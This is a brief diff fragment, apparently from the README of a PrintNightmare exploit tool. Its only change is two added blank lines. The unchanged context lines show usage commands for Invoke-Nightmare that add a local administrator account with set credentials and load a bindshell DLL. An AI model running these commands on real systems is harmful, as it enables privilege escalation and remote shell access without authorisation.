@@ -20,3 +20,5 @@ Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by defau
 Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
 Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
 ```
+
+
